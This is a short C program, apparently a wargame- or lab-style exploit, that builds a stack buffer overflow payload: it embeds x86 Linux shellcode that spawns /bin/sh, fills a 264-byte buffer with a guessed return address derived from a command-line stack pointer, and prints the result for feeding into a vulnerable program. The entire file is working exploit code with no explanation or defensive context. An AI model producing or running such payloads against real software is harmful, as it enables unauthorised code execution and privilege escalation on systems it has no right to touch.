#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char** argv){
	char *buff, *ptr;
	long *adr_ptr; 
	int i;
	char shellcode[] = "\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80";
	unsigned long stackpointer = strtoul(argv[1], NULL, 10)-1776;
	buff = malloc(265);
	ptr = buff;
	adr_ptr = (long*) ptr;
	for (i=0;i<264;i+=4)
		*(adr_ptr++) = stackpointer;
	ptr = buff;
	for (i=0; i<strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[264]='\0';
	printf("%s",buff);
}
